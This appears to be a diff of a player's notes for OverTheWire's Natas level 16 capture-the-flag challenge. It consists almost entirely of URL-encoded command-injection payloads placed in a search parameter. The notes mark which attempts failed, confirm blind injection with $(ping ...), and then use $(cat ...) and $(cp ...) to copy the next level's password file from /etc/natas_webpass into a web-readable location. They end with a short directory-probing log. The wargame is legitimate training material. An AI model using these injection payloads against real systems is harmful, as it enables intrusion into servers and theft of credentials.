@@ -1,6 +1,50 @@
 php -S localhost:8000
 
+=> the minimum characters to consider dangerous ` & | $ ( ) ;
+
+
+=>http://localhost:8000/code_16.php?needle=a payload.txt
+pwd #&submit=Search
 http://localhost:8000/code_16.php?needle=a+payload.txt%0Apwd+%23&submit=Search
+->didnt work
+
+=>http://localhost:8000/code_16.php?needle=a payload.txt
+ping -c 127.0.0.1 #&submit=Search
+http://localhost:8000/code_16.php?needle=a+payload.txt%0Aping+-c+10+127.0.0.1+%23&submit=Search
+->didnt work
+
+$(echo pwd)
+=>http://localhost:8000/code_16.php?needle=a payload.txt$(echo pwd) #&submit=Search
+http://localhost:8000/code_16.php?needle=a+payload.txt%24%28echo+pwd%29+%23&submit=Search
+->this didnt work
 
 
-http://localhost:8000/code_16.php?needle=a+payload.txt%0Acp+%2Fetc%2Fnatas_webpass%2Fnatas17+%2Fupload+%23&submit=Search
+=>http://localhost:8000/code_16.php?needle=a payload.txt$(ping -c 20 127.0.0.1) #&submit=Search
+http://localhost:8000/code_16.php?needle=a+payload.txt%24(ping+-c+20+127.0.0.1)+%23&submit=Search
+->and this worked, the blind ;)
+
+
+=>http://natas16.natas.labs.overthewire.org/?needle=0 payload.txt$(ping -c 20 1.1.1.1) #&submit=Search
+http://natas16.natas.labs.overthewire.org/?needle=0+payload.txt%24(ping+-c+20+1.1.1.1)+%23&submit=Search
+
+
+=>http://natas16.natas.labs.overthewire.org/?needle=0 payload.txt$(cp /etc/natas_webpass/natas17 /uploads/natas17) #&submit=Search
+http://natas16.natas.labs.overthewire.org/?needle=0+payload.txt%24(cp+%2Fetc%2Fnatas_webpass%2Fnatas17+%2Fuploads%2Fnatas17)+%23&submit=Search
+
+=>cat /etc/natas_webpass/natas17 > /passna.txt
+=>http://natas16.natas.labs.overthewire.org/?needle=0 payload.txt$(cat /etc/natas_webpass/natas17 > /passna.txt) #&submit=Search
+http://natas16.natas.labs.overthewire.org/?needle=0+payload.txt%24(cat+%2Fetc%2Fnatas_webpass%2Fnatas17+%3E+%2Fpassna.txt)+%23&submit=Search
+
+=>cat /etc/natas_webpass/natas17 > ./passna.txt
+=>http://natas16.natas.labs.overthewire.org/?needle=0 payload.txt$(cat /etc/natas_webpass/natas17 > ./passna.txt) #&submit=Search
+http://natas16.natas.labs.overthewire.org/?needle=0+payload.txt%24(cat+%2Fetc%2Fnatas_webpass%2Fnatas17+%3E+.%2Fpassna.txt)+%23&submit=Search
+
+
+http://natas.labs.overthewire.org:80/cgi-bin/   forbidden
+http://natas.labs.overthewire.org:80/   ok
+http://natas.labs.overthewire.org:80/img/   forbidden
+http://natas.labs.overthewire.org:80/icons/ forbidden
+http://natas.labs.overthewire.org:80/css/   forbidden
+http://natas.labs.overthewire.org:80/js/    forbidden
+
+
